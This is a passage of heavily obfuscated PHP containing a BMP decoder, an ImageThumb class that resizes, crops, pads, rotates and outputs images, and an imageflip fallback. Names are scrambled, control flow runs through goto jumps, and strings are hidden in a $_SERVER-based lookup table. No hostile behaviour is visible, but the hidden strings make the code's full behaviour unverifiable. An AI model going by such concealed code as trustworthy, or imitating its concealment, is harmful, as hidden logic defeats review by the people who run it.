($a§®çÂ≠›Ô & 2147483648) { $a§®çÂ≠›Ô = -(~$a§®çÂ≠›Ô & 4294967295) - 1; } if ($E◊≤¯ÊÀ““ & 2147483648) { $E◊≤¯ÊÀ““ = -(~$E◊≤¯ÊÀ““ & 4294967295) - 1; } if ($dóÉˆ“›ç£ & 2147483648) { $dóÉˆ“›ç£ = -(~$dóÉˆ“›ç£ & 4294967295) - 1; } goto A◊‘÷â©Ò«; Eıï€ÃŸå¥: if (($D ê£±åÒÃ == 16 || $D ê£±åÒÃ == 24 || $D ê£±åÒÃ == 32) && $E‘õ›¬÷ßƒ == 0 && $E‚Ñıøé‚⁄ == 0 && $aä£òà·€ == 0 && $eÎ≤÷Æ‘¶• == 0) { switch ($D ê£±åÒÃ) { case 16: $E‚Ñıøé‚⁄ = 31744; $aä£òà·€ = 992; $eÎ≤÷Æ‘¶• = 31; break; case 24: case 32: $E‚Ñıøé‚⁄ = 16711680; $aä£òà·€ = 65280; $eÎ≤÷Æ‘¶• = 255; break; } } goto BùÛπëá…Õ; A◊‘÷â©Ò«: if ($B∏ùù¡„§◊ & 2147483648) { $B∏ùù¡„§◊ = -(~$B∏ùù¡„§◊ & 4294967295) - 1; } if ($cƒªçñ¿´„[$C©‹¬øÜ¥ƒ[512]] != 0) { $Bÿ≤å∑ﬂ¿¶ = $D ê£±åÒÃ == 1 || $D ê£±åÒÃ == 4 || $D ê£±åÒÃ == 8 ? ($eå•º∑Æü» ? $eå•º∑Æü» : pow(2, $D ê£±åÒÃ)) << 2 : 0; $Cí“èıﬂ«‡ = $F¯‚îµÕ€ò ? $F¯‚îµÕ€ò : ($a§®çÂ≠›Ô * $D ê£±åÒÃ + 31 >> 3 & ~3) * abs($E◊≤¯ÊÀ““); $EÍ¥ˆ≤áã√ = $cƒªçñ¿´„[$C©‹¬øÜ¥ƒ[512]] - $Cí“èıﬂ«‡ - $Bÿ≤å∑ﬂ¿¶ - 14; if ($a™Œ•Ω÷îê < $EÍ¥ˆ≤áã√ && 40 <= $a™Œ•Ω÷îê && $a™Œ•Ω÷îê <= 124) { $a™Œ•Ω÷îê = $EÍ¥ˆ≤áã√; } } if ($a™Œ•Ω÷îê - 40 > 0) { $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $a™Œ•Ω÷îê - 40); if ($bìòæ‘‹—ù === !1) { return !1; } extract(unpack($C©‹¬øÜ¥ƒ[1761] . $C©‹¬øÜ¥ƒ[1762] . $C©‹¬øÜ¥ƒ[1763] . $C©‹¬øÜ¥ƒ[1764], $bìòæ‘‹—ù . str_repeat($C©‹¬øÜ¥ƒ[1765], 120))); } else { $BÏâ—‰ôÔô = $E‚Ñıøé‚⁄ = $aä£òà·€ = $eÎ≤÷Æ‘¶• = 0; } goto Eıï€ÃŸå¥; f≈¨øØ ¯: $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, 36); if ($bìòæ‘‹—ù === !1) { return !1; } extract(unpack($C©‹¬øÜ¥ƒ[1752] . $C©‹¬øÜ¥ƒ[1753] . $C©‹¬øÜ¥ƒ[1750] . $C©‹¬øÜ¥ƒ[1754] . $C©‹¬øÜ¥ƒ[1755] . $C©‹¬øÜ¥ƒ[1756] . $C©‹¬øÜ¥ƒ[1757] . $C©‹¬øÜ¥ƒ[1758] . $C©‹¬øÜ¥ƒ[1759] . $C©‹¬øÜ¥ƒ[1760], $bìòæ‘‹—ù)); goto AÀû≤ΩÉÍº; BùÛπëá…Õ: } } goto eøËﬁëüØÈ; eøËﬁëüØÈ: if ($a§®çÂ≠›Ô == 0 || $E◊≤¯ÊÀ““ == 0 || $d·Ÿ”⁄ïõµ != 1 || ($BÏâ—‰ôÔô & $E‚Ñıøé‚⁄) != 0 || ($BÏâ—‰ôÔô & $aä£òà·€) != 0 || ($BÏâ—‰ôÔô & $eÎ≤÷Æ‘¶•) != 0 || ($E‚Ñıøé‚⁄ & $aä£òà·€) != 0 || ($E‚Ñıøé‚⁄ & $eÎ≤÷Æ‘¶•) != 0 || ($aä£òà·€ & $eÎ≤÷Æ‘¶•) != 0) { return !1; } if ($E‘õ›¬÷ßƒ == 4 || $E‘õ›¬÷ßƒ == 5) { $bìòæ‘‹—ù = stream_get_contents($Eﬁ∂÷Ñ˘û®, $F¯‚îµÕ€ò); if ($bìòæ‘‹—ù === !1) { return !1; } return imagecreatefromstring($bìòæ‘‹—ù); } $dêøÉ·ë© = $a§®çÂ≠›Ô * $D ê£±åÒÃ + 31 >> 3 & ~3; goto f≈…·Ï∏ø‹; eú√éä à÷: if ($D ê£±åÒÃ == 1 || $D ê£±åÒÃ == 4 || $D ê£±åÒÃ == 8) { goto Aúßÿ√Àææ; D Ö˘Ê˘´¶: $BÿÁ§»Ï±Ø = array(); for ($fƒÚÜƒ¬∞Ï = 0; $fƒÚÜƒ¬∞Ï < $AŒìÖç≠úª; ++$fƒÚÜƒ¬∞Ï) { $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $dˆåÉ‹≤êÀ); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } extract(unpack($C©‹¬øÜ¥ƒ[1766], $bìòæ‘‹—ù . $C©‹¬øÜ¥ƒ[1765])); $BÿÁ§»Ï±Ø[] = imagecolorallocate($dœÛÜÿà∑Ï, $a–Ë∆¯É¥, $F¥äÑ‚›÷Ô, $A⁄é†œ∑øπ); } $aëéÆˆîÿÁ = 8 - $D ê£±åÒÃ; goto Eœ¡œ÷Üõá; Aúßÿ√Àææ: $dœÛÜÿà∑Ï = imagecreate($a§®çÂ≠›Ô, $C£Ü∫ÉáÍı); $dˆåÉ‹≤êÀ = $a™Œ•Ω÷îê == 12 ? 3 : 4; $AŒìÖç≠úª = $eå•º∑Æü» ? $eå•º∑Æü» : pow(2, $D ê£±åÒÃ); goto D Ö˘Ê˘´¶; Eœ¡œ÷Üõá: $còÒ”äåÆ∏ = (1 << $D ê£±åÒÃ) - 1 << $aëéÆˆîÿÁ; if ($E‘õ›¬÷ßƒ == 1 || $E‘õ›¬÷ßƒ == 2) { $AΩæªÜöÊÑ = 0; $F–¥ÛÖé¶≤ = $D ê£±åÒÃ >> 2 & 1; for (;;) { if ($AΩæªÜöÊÑ < -1 || $AΩæªÜöÊÑ > $a§®çÂ≠›Ô || $F‹Œ¢∏øâŸ < -1 || $F‹Œ¢∏øâŸ > $E◊≤¯ÊÀ““) { imagedestroy($dœÛÜÿà∑Ï); return !1; } $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, 1); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } switch ($bìòæ‘‹—ù) { case $C©‹¬øÜ¥ƒ[1765]: $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, 1); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } switch ($bìòæ‘‹—ù) { case $C©‹¬øÜ¥ƒ[1765]: $F‹Œ¢∏øâŸ += $c‹⁄ÊÏÔõË; $AΩæªÜöÊÑ = 0; break; case $C©‹¬øÜ¥ƒ[1767]: $F‹Œ¢∏øâŸ = 0; $AΩæªÜöÊÑ = 0; break 3; case $C©‹¬øÜ¥ƒ[1768]: $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, 2); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } list(, $e‚ˆÊüÃÇù, $eƒ◊‹âÎ›∏) = unpack($C©‹¬øÜ¥ƒ[1769], $bìòæ‘‹—ù); $AΩæªÜöÊÑ += $e‚ˆÊüÃÇù; $F‹Œ¢∏øâŸ += $eƒ◊‹âÎ›∏ * $c‹⁄ÊÏÔõË; break; default: list(, $BÆöÌèî‰‡) = unpack($C©‹¬øÜ¥ƒ[1770], $bìòæ‘‹—ù); $B◊Ú‹ôﬁ‰å = ($BÆöÌèî‰‡ >> $F–¥ÛÖé¶≤) + ($BÆöÌèî‰‡ & $F–¥ÛÖé¶≤); $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $B◊Ú‹ôﬁ‰å + 1 & ~1); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } for ($fƒÚÜƒ¬∞Ï = 0, $DµµÃ¨Ÿî§ = 0; $fƒÚÜƒ¬∞Ï < $BÆöÌèî‰‡; ++$fƒÚÜƒ¬∞Ï, ++$AΩæªÜöÊÑ, $DµµÃ¨Ÿî§ += $D ê£±åÒÃ) { list(, $bœ›Á⁄ÉÜ≈) = unpack($C©‹¬øÜ¥ƒ[1770], $bìòæ‘‹—ù[$DµµÃ¨Ÿî§ >> 3]); $A⁄é†œ∑øπ = $DµµÃ¨Ÿî§ & 7; imagesetpixel($dœÛÜÿà∑Ï, $AΩæªÜöÊÑ, $F‹Œ¢∏øâŸ, $BÿÁ§»Ï±Ø[($bœ›Á⁄ÉÜ≈ & $còÒ”äåÆ∏ >> $A⁄é†œ∑øπ) >> $aëéÆˆîÿÁ - $A⁄é†œ∑øπ]); } break; } break; default: $câ‹ã¢å€∞ = fread($Eﬁ∂÷Ñ˘û®, 1); if ($câ‹ã¢å€∞ === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } list(, $A˜∏—á≠ı“, $bœ›Á⁄ÉÜ≈) = unpack($C©‹¬øÜ¥ƒ[1769], $bìòæ‘‹—ù . $câ‹ã¢å€∞); for ($fƒÚÜƒ¬∞Ï = 0, $DµµÃ¨Ÿî§ = 0; $fƒÚÜƒ¬∞Ï < $A˜∏—á≠ı“; ++$fƒÚÜƒ¬∞Ï, ++$AΩæªÜöÊÑ, $DµµÃ¨Ÿî§ += $D ê£±åÒÃ) { $A⁄é†œ∑øπ = $DµµÃ¨Ÿî§ & 7; imagesetpixel($dœÛÜÿà∑Ï, $AΩæªÜöÊÑ, $F‹Œ¢∏øâŸ, $BÿÁ§»Ï±Ø[($bœ›Á⁄ÉÜ≈ & $còÒ”äåÆ∏ >> $A⁄é†œ∑øπ) >> $aëéÆˆîÿÁ - $A⁄é†œ∑øπ]); } break; } } } else { for ($d€√ú›™¨ò = 0; $d€√ú›™¨ò < $C£Ü∫ÉáÍı; ++$d€√ú›™¨ò, $F‹Œ¢∏øâŸ += $c‹⁄ÊÏÔõË) { $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $dêøÉ·ë©); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } $DµµÃ¨Ÿî§ = 0; for ($AΩæªÜöÊÑ = 0; $AΩæªÜöÊÑ < $a§®çÂ≠›Ô; ++$AΩæªÜöÊÑ, $DµµÃ¨Ÿî§ += $D ê£±åÒÃ) { list(, $bœ›Á⁄ÉÜ≈) = unpack($C©‹¬øÜ¥ƒ[1770], $bìòæ‘‹—ù[$DµµÃ¨Ÿî§ >> 3]); $A⁄é†œ∑øπ = $DµµÃ¨Ÿî§ & 7; imagesetpixel($dœÛÜÿà∑Ï, $AΩæªÜöÊÑ, $F‹Œ¢∏øâŸ, $BÿÁ§»Ï±Ø[($bœ›Á⁄ÉÜ≈ & $còÒ”äåÆ∏ >> $A⁄é†œ∑øπ) >> $aëéÆˆîÿÁ - $A⁄é†œ∑øπ]); } } } goto c™´≈®ø·ê; c™´≈®ø·ê: } else { goto E–Ÿ‘®ûÛƒ; EÁÊ∫à‹ŒÛ: for ($d€√ú›™¨ò = 0; $d€√ú›™¨ò < $C£Ü∫ÉáÍı; ++$d€√ú›™¨ò, $F‹Œ¢∏øâŸ += $c‹⁄ÊÏÔõË) { $bìòæ‘‹—ù = fread($Eﬁ∂÷Ñ˘û®, $dêøÉ·ë©); if ($bìòæ‘‹—ù === !1) { imagedestroy($dœÛÜÿà∑Ï); return !1; } $DµµÃ¨Ÿî§ = 0; for ($AΩæªÜöÊÑ = 0; $AΩæªÜöÊÑ < $a§®çÂ≠›Ô; ++$AΩæªÜöÊÑ, $DµµÃ¨Ÿî§ += $B©üÊ¨í∂ı) { list(, $bœ›Á⁄ÉÜ≈) = unpack($C©‹¬øÜ¥ƒ[1747], substr($bìòæ‘‹—ù, $DµµÃ¨Ÿî§, $B©üÊ¨í∂ı) . $C©‹¬øÜ¥ƒ[1771]); $f÷ÉËÀ ‹√ = $bœ›Á⁄ÉÜ≈ & $BÏâ—‰ôÔô; $E⁄“ ë≈œè = $bœ›Á⁄ÉÜ≈ & $E‚Ñıøé‚⁄; $fÃåî§˜‡ = $bœ›Á⁄ÉÜ≈ & $aä£òà·€; $b¢€€Ÿ“µë = $bœ›Á⁄ÉÜ≈ & $eÎ≤÷Æ‘¶•; $aÔãÚ¯∫ó‡ = $f†“úı•Ò£ - (($f÷ÉËÀ ‹√ << 7) - $f÷ÉËÀ ‹√) * $C™ﬁïﬁÜºÕ; $a–Ë∆¯É¥ = (($E⁄“ ë≈œè << 8) - $E⁄“ ë≈œè) * $e∂ëπ˜¶∞‚; $F¥äÑ‚›÷Ô = (($fÃåî§˜‡ << 8) - $fÃåî§˜‡) * $D¥ââ«Õ¡–; $A⁄é†œ∑øπ = (($b¢€€Ÿ“µë << 8) - $b¢€€Ÿ“µë) * $fµÍÎ©ããö; imagesetpixel($dœÛÜÿà∑Ï, $AΩæªÜöÊÑ, $F‹Œ¢∏øâŸ, $aÔãÚ¯∫ó‡ << 24 | $a–Ë∆¯É¥ << 16 | $F¥äÑ‚›÷Ô << 8 | $A⁄é†œ∑øπ); } } imagealphablending($dœÛÜÿà∑Ï, !0); goto bæá¯∆ÆË«; Aò∆‘ì´»∫: $B©üÊ¨í∂ı = $D ê£±åÒÃ >> 3; $f†“úı•Ò£ = $BÏâ—‰ôÔô ? 127 : 0; $C™ﬁïﬁÜºÕ = $BÏâ—‰ôÔô ? 1 / $BÏâ—‰ôÔô : 1; goto dÌı¥Ê¡é¶; E–Ÿ‘®ûÛƒ: $dœÛÜÿà∑Ï = imagecreatetruecolor($a§®çÂ≠›Ô, $C£Ü∫ÉáÍı); imagealphablending($dœÛÜÿà∑Ï, !1); if ($BÏâ—‰ôÔô) { imagesavealpha($dœÛÜÿà∑Ï, !0); } goto Aò∆‘ì´»∫; dÌı¥Ê¡é¶: $e∂ëπ˜¶∞‚ = $E‚Ñıøé‚⁄ ? 1 / $E‚Ñıøé‚⁄ : 1; $D¥ââ«Õ¡– = $aä£òà·€ ? 1 / $aä£òà·€ : 1; $fµÍÎ©ããö = $eÎ≤÷Æ‘¶• ? 1 / $eÎ≤÷Æ‘¶• : 1; goto EÁÊ∫à‹ŒÛ; bæá¯∆ÆË«: } return $dœÛÜÿà∑Ï; goto eÖªä›”™≥; f≈…·Ï∏ø‹: $C£Ü∫ÉáÍı = abs($E◊≤¯ÊÀ““); $F‹Œ¢∏øâŸ = $E◊≤¯ÊÀ““ > 0 ? $C£Ü∫ÉáÍı - 1 : 0; $c‹⁄ÊÏÔõË = $E◊≤¯ÊÀ““ > 0 ? -1 : 1; goto eú√éä à÷; eÖªä›”™≥: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($DÛÚ«ÏÉÕŸ, $bª≤ ®”âå) { goto bÑ∞”Ç‹¿; b√Ö¥º≠Ñ¿: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto E—éêåÂã⁄; DÆΩ∏√Ü©›: if (!$this->im) { return !1; } $eöõ£…—Úü = $_SERVER[£¿ÌÙëü¡¯¯][33]; $this->imgData = GetImageSize($DÛÚ«ÏÉÕŸ, $eöõ£…—Úü); goto b√Ö¥º≠Ñ¿; bÑ∞”Ç‹¿: $this->srcFile = $DÛÚ«ÏÉÕŸ; $this->echoType = $bª≤ ®”âå; $this->im = self::image($DÛÚ«ÏÉÕŸ); goto DÆΩ∏√Ü©›; E—éêåÂã⁄: } public static function image($càôù£âïÀ) { $f¥±€Ñ°ÿ± =& $_SERVER[£¿ÌÙëü¡¯¯]; $f›â˜√àÖπ = $f¥±€Ñ°ÿ±[33]; $eüµû⁄ÙÜ— = GetImageSize($càôù£âïÀ, $f›â˜√àÖπ); $aÈ”Ò˘Üä§ = !1; switch ($eüµû⁄ÙÜ—[2]) { case IMAGETYPE_GIF: if (!function_exists($f¥±€Ñ°ÿ±[1772])) { break; } $aÈ”Ò˘Üä§ = imagecreatefromgif($càôù£âïÀ); break; case IMAGETYPE_JPEG: if (!function_exists($f¥±€Ñ°ÿ±[1773])) { break; } $aÈ”Ò˘Üä§ = imagecreatefromjpeg($càôù£âïÀ); break; case IMAGETYPE_PNG: if (!function_exists($f¥±€Ñ°ÿ±[1774])) { break; } $aÈ”Ò˘Üä§ = @imagecreatefrompng($càôù£âïÀ); imagesavealpha($aÈ”Ò˘Üä§, !0); break; case IMAGETYPE_XBM: $aÈ”Ò˘Üä§ = imagecreatefromxbm($càôù£âïÀ); break; case IMAGETYPE_WBMP: $aÈ”Ò˘Üä§ = imagecreatefromwbmp($càôù£âïÀ); break; case IMAGETYPE_BMP: $aÈ”Ò˘Üä§ = imagecreatefrombmp($càôù£âïÀ); break; default: break; } return $aÈ”Ò˘Üä§; } public static function imageSize($C∂öƒ≥çÍ´) { $Dº£ØÖ•ïô =& $_SERVER[£¿ÌÙëü¡¯¯]; $FØ’†·ƒøÏ = GetImageSize($C∂öƒ≥çÍ´); if (!$FØ’†·ƒøÏ) { return !1; } return array($Dº£ØÖ•ïô[1775] => $FØ’†·ƒøÏ[0], $Dº£ØÖ•ïô[1776] => $FØ’†·ƒøÏ[1]); } function distortion($e≈…‘ÈªÔÀ, $Båù…µ⁄¨¬, $bòºÆ≤ëºÖ) { $FÔ›‹·ªä‚ = $this->creatImage($this->im, $Båù…µ⁄¨¬, $bòºÆ≤ëºÖ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($FÔ›‹·ªä‚, $e≈…‘ÈªÔÀ); } function prorate($D›«’Ÿ¿åï, $cØÕ™è◊ä∆, $fî˜Àﬁüâ) { $fëÑ¢—©œÜ = $cØÕ™è◊ä∆ / $fî˜Àﬁüâ; $D›Ô≤»˜åÉ = $this->srcW / $this->srcH; if ($fëÑ¢—©œÜ <= $D›Ô≤»˜åÉ) { $fƒÁ∆ÖãŒ = $cØÕ™è◊ä∆; $Fµ£´Ìé‡ı = $fƒÁ∆ÖãŒ * ($this->srcH / $this->srcW); } else { $Fµ£´Ìé‡ı = $fî˜Àﬁüâ; $fƒÁ∆ÖãŒ = $Fµ£´Ìé‡ı * ($this->srcW / $this->srcH); } if ($this->srcW > $cØÕ™è◊ä∆ || $this->srcH > $fî˜Àﬁüâ) { $dÑé∑ûÁúÈ = $this->creatImage($this->im, $fƒÁ∆ÖãŒ, $Fµ£´Ìé‡ı, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dÑé∑ûÁúÈ, $D›«’Ÿ¿åï); } else { $dÑé∑ûÁúÈ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dÑé∑ûÁúÈ, $D›«’Ÿ¿åï); } } function cut($AπâÒù˜ÎÈ, $cı¡Ö”∑Î≤, $Cœ≥éÚÓª·) { goto DõÉ©Ñ„–ó; Eºöìáå‘√: return $this->echoImage($eêîà©ïÜá, $AπâÒù˜ÎÈ); goto E¿»˘é·∞á; DõÉ©Ñ„–ó: $bæÚ¨»’Áà = $cı¡Ö”∑Î≤ / $Cœ≥éÚÓª·; $DÜãöñ”ïü = $this->srcW / $this->srcH; if ($bæÚ¨»’Áà <= $DÜãöñ”ïü) { $cµûıã⁄⁄ê = $Cœ≥éÚÓª·; $föê’ç«‹Á = $cµûıã⁄⁄ê * ($this->srcW / $this->srcH); } else { $föê’ç«‹Á = $cı¡Ö”∑Î≤; $cµûıã⁄⁄ê = $föê’ç«‹Á * ($this->srcH / $this->srcW); } goto eÊâíÙ»„ü; eÊâíÙ»„ü: $Aºô—å°Ùë = $this->creatImage($this->im, $föê’ç«‹Á, $cµûıã⁄⁄ê, 0, 0, 0, 0, $this->srcW, $this->srcH); $eêîà©ïÜá = $this->creatImage($Aºô—å°Ùë, $cı¡Ö”∑Î≤, $Cœ≥éÚÓª·, 0, 0, ($föê’ç«‹Á - $cı¡Ö”∑Î≤) / 2, ($cµûıã⁄⁄ê - $Cœ≥éÚÓª·) / 2, $cı¡Ö”∑Î≤, $Cœ≥éÚÓª·); imageDestroy($Aºô—å°Ùë); goto Eºöìáå‘√; E¿»˘é·∞á: } function backFill($D∫òÌÃæÈ≈, $DçÍù‹Êç¡, $CîÕ›≈œ»®, $C¥Ü £†±· = false, $D•≈Ï§ÇºÖ = 255, $b∫ŒÍÚ Ü∆ = 255, $BÜöÌÈé™ƒ = 255) { goto A®¯’πñ§æ; A®¯’πñ§æ: $A∏∏ê∆Ï•Ê = $DçÍù‹Êç¡ / $CîÕ›≈œ»®; $eñõå°àÿÃ = $this->srcW / $this->srcH; if ($A∏∏ê∆Ï•Ê <= $eñõå°àÿÃ) { $aÀøÉéŸ’ë = $DçÍù‹Êç¡; $d™ˆãœíá∂ = $aÀøÉéŸ’ë * ($this->srcH / $this->srcW); } else { $d™ˆãœíá∂ = $CîÕ›≈œ»®; $aÀøÉéŸ’ë = $d™ˆãœíá∂ * ($this->srcW / $this->srcH); } goto f£íÆø£çº; B∆‘«ÍÎæú: return $this->echoImage($FÃ‘ÛôÀﬂ©, $D∫òÌÃæÈ≈); goto f…®ıœ€˜ù; f£íÆø£çº: if (function_exists($_SERVER[£¿ÌÙëü¡¯¯][1777])) { @($FÃ‘ÛôÀﬂ© = imageCreateTrueColor($DçÍù‹Êç¡, $CîÕ›≈œ»®)); if (!$FÃ‘ÛôÀﬂ©) { $FÃ‘ÛôÀﬂ© = imageCreate($DçÍù‹Êç¡, $CîÕ›≈œ»®); } } else { $FÃ‘ÛôÀﬂ© = imageCreate($DçÍù‹Êç¡, $CîÕ›≈œ»®); } $Bê’ñÒµô = ($CîÕ›≈œ»® - $d™ˆãœíá∂) / 2; $a⁄ëåﬁôüª = imagecolorallocate($FÃ‘ÛôÀﬂ©, $D•≈Ï§ÇºÖ, $b∫ŒÍÚ Ü∆, $BÜöÌÈé™ƒ); goto Fª⁄Éêã…˘; Fª⁄Éêã…˘: if ($C¥Ü £†±·) { $a⁄ëåﬁôüª = imageColorTransparent($FÃ‘ÛôÀﬂ©, $a⁄ëåﬁôüª); $Bê’ñÒµô = $CîÕ›≈œ»® - $d™ˆãœíá∂; } imageFilledRectangle($FÃ‘ÛôÀﬂ©, 0, 0, $DçÍù‹Êç¡, $CîÕ›≈œ»®, $a⁄ëåﬁôüª); if ($this->srcW > $DçÍù‹Êç¡ || $this->srcH > $CîÕ›≈œ»®) { $BÌ¨ù£˘Ã‘ = $this->creatImage($this->im, $aÀøÉéŸ’ë, $d™ˆãœíá∂, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($aÀøÉéŸ’ë < $DçÍù‹Êç¡) { imageCopy($FÃ‘ÛôÀﬂ©, $BÌ¨ù£˘Ã‘, ($DçÍù‹Êç¡ - $aÀøÉéŸ’ë) / 2, 0, 0, 0, $aÀøÉéŸ’ë, $d™ˆãœíá∂); } else { if ($d™ˆãœíá∂ < $CîÕ›≈œ»®) { imageCopy($FÃ‘ÛôÀﬂ©, $BÌ¨ù£˘Ã‘, 0, $Bê’ñÒµô, 0, 0, $aÀøÉéŸ’ë, $d™ˆãœíá∂); } else { imageCopy($FÃ‘ÛôÀﬂ©, $BÌ¨ù£˘Ã‘, 0, 0, 0, 0, $aÀøÉéŸ’ë, $d™ˆãœíá∂); } } } else { imageCopyMerge($FÃ‘ÛôÀﬂ©, $this->im, ($DçÍù‹Êç¡ - $aÀøÉéŸ’ë) / 2, $Bê’ñÒµô, 0, 0, $aÀøÉéŸ’ë, $d™ˆãœíá∂, 100); } goto B∆‘«ÍÎæú; f…®ıœ€˜ù: } function creatImage($E∆áÊØ´ê„, $dó„ﬁ†◊üË, $BëÂöÈÒü, $fî§Ç–ˆÚ∆, $e›èÁ¢§Àã, $Dîé„Â‹⁄ù, $aÆ»∆Èªè“, $cÓÜöØß≈Æ, $C∞·¯›ú÷Ÿ) { if (function_exists($_SERVER[£¿ÌÙëü¡¯¯][1777])) { @($E€‡™ÂÍÏ— = ImageCreateTrueColor($dó„ﬁ†◊üË, $BëÂöÈÒü)); @imagealphablending($E€‡™ÂÍÏ—, !1); @imagesavealpha($E€‡™ÂÍÏ—, !0); if ($E€‡™ÂÍÏ—) { imageCopyResampled($E€‡™ÂÍÏ—, $E∆áÊØ´ê„, $fî§Ç–ˆÚ∆, $e›èÁ¢§Àã, $Dîé„Â‹⁄ù, $aÆ»∆Èªè“, $dó„ﬁ†◊üË, $BëÂöÈÒü, $cÓÜöØß≈Æ, $C∞·¯›ú÷Ÿ); } else { $E€‡™ÂÍÏ— = ImageCreate($dó„ﬁ†◊üË, $BëÂöÈÒü); imageCopyResized($E€‡™ÂÍÏ—, $E∆áÊØ´ê„, $fî§Ç–ˆÚ∆, $e›èÁ¢§Àã, $Dîé„Â‹⁄ù, $aÆ»∆Èªè“, $dó„ﬁ†◊üË, $BëÂöÈÒü, $cÓÜöØß≈Æ, $C∞·¯›ú÷Ÿ); } } else { $E€‡™ÂÍÏ— = ImageCreate($dó„ﬁ†◊üË, $BëÂöÈÒü); imageCopyResized($E€‡™ÂÍÏ—, $E∆áÊØ´ê„, $fî§Ç–ˆÚ∆, $e›èÁ¢§Àã, $Dîé„Â‹⁄ù, $aÆ»∆Èªè“, $dó„ﬁ†◊üË, $BëÂöÈÒü, $cÓÜöØß≈Æ, $C∞·¯›ú÷Ÿ); } return $E€‡™ÂÍÏ—; } public function imgRotate($Dª≥√–ü¶ä, $c¿√Ë˘¡ûù) { goto DÇ‚Ç˜ËÔ«; A•ÙÊà¥¬: return $cçÓ◊ì•ú∏; goto B£´ñÜÙóæ; eƒäçËÉ•–: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $cçÓ◊ì•ú∏ = imagegif($cÓÛäùïÿ¯, $Dª≥√–ü¶ä); break; case IMAGETYPE_JPEG: $cçÓ◊ì•ú∏ = imagejpeg($cÓÛäùïÿ¯, $Dª≥√–ü¶ä, 100); break; case IMAGETYPE_PNG: $cçÓ◊ì•ú∏ = imagePNG($cÓÛäùïÿ¯, $Dª≥√–ü¶ä); break; default: break; } imageDestroy($cÓÛäùïÿ¯); imageDestroy($this->im); goto A•ÙÊà¥¬; DÇ‚Ç˜ËÔ«: if (!$this->im || $c¿√Ë˘¡ûù % 360 === 0 || !function_exists($_SERVER[£¿ÌÙëü¡¯¯][1778])) { return !1; } $cÓÛäùïÿ¯ = imageRotate($this->im, 360 - $c¿√Ë˘¡ûù, 0); $cçÓ◊ì•ú∏ = !1; goto eƒäçËÉ•–; B£´ñÜÙóæ: } function echoImage($BâÙ¿ÏÓòä, $C¿ë„≥„…ï) { goto céé«îØ◊‹; BØ÷ﬁ¢òÈæ: $b·ããÆºÓﬁ = !1; switch ($this->echoType) { case $Dçì≠ €âá[1779]: $b·ããÆºÓﬁ = imagePNG($BâÙ¿ÏÓòä); break; case $Dçì≠ €âá[164]: $b·ããÆºÓﬁ = imagePNG($BâÙ¿ÏÓòä, $C¿ë„≥„…ï); break; } imageDestroy($BâÙ¿ÏÓòä); goto DûÂå‹©ä¬; DûÂå‹©ä¬: imageDestroy($this->im); return $b·ããÆºÓﬁ; goto fŸÁÜØ∂©÷; céé«îØ◊‹: $Dçì≠ €âá =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$BâÙ¿ÏÓòä) { return !1; } ob_get_clean(); goto BØ÷ﬁ¢òÈæ; fŸÁÜØ∂©÷: } } if (!function_exists($_SERVER[£¿ÌÙëü¡¯¯][1780])) { define($_SERVER[£¿ÌÙëü¡¯¯][1781], 0); define($_SERVER[£¿ÌÙëü¡¯¯][1782], 1); define($_SERVER[£¿ÌÙëü¡¯¯][1783], 2); function imageflip($A€π…Œ˜ã¶, $F—êåÕ·©¶) { switch ($F—êåÕ·©¶) { case IMG_FLIP_HORIZONTAL: $B‘¥´ÍÆ∂Û = imagesx($A€π…Œ˜ã¶) - 1; $eºÖõÒèÎ = $B‘¥´ÍÆ∂Û / 2; $c ﬂ’’”¶⁄ = imagesy($A€π…Œ˜ã¶); $B´çè—¯Ïî = imageistruecolor($A€π…Œ˜ã¶) ? imagecreatetruecolor(1, $c ﬂ’’”¶⁄) : imagecreate(1, $c ﬂ’’”¶⁄); for ($Bÿ®›Ê®ﬁø = 0; $Bÿ®›Ê®ﬁø < $eºÖõÒèÎ; ++$Bÿ®›Ê®ﬁø) { imagecopy($B´çè—¯Ïî, $A€π…Œ˜ã¶, 0, 0, $Bÿ®›Ê®ﬁø, 0, 1, $c ﬂ’’”¶⁄); imagecopy($A€π…Œ˜ã¶, $A€π…Œ˜ã¶, $Bÿ®›Ê®ﬁø, 0, $B‘¥´ÍÆ∂Û - $Bÿ®›Ê®ﬁø, 0, 1, $c ﬂ’’”¶⁄); imagecopy($A€π…Œ˜ã¶, $B´çè—¯Ïî, $B‘¥´ÍÆ∂Û - $Bÿ®›Ê®ﬁø, 0, 0, 0, 1, $c ﬂ’’”¶⁄); } break; case IMG_FLIP_VERTICAL: $fÍ◊é·Î•Ç = imagesx($A€π…Œ˜ã¶); $Cå⁄≤´€È€ = imagesy($A€π…Œ˜ã¶) - 1; $b•çøúãüı = $Cå⁄≤´€È€ / 2; $B´çè—¯Ïî = imageistruecolor($A€π…Œ˜ã¶) ? imagecreatetruecolor($fÍ◊é·Î•Ç, 1) : imagecreate($fÍ◊é·Î•Ç, 1); for 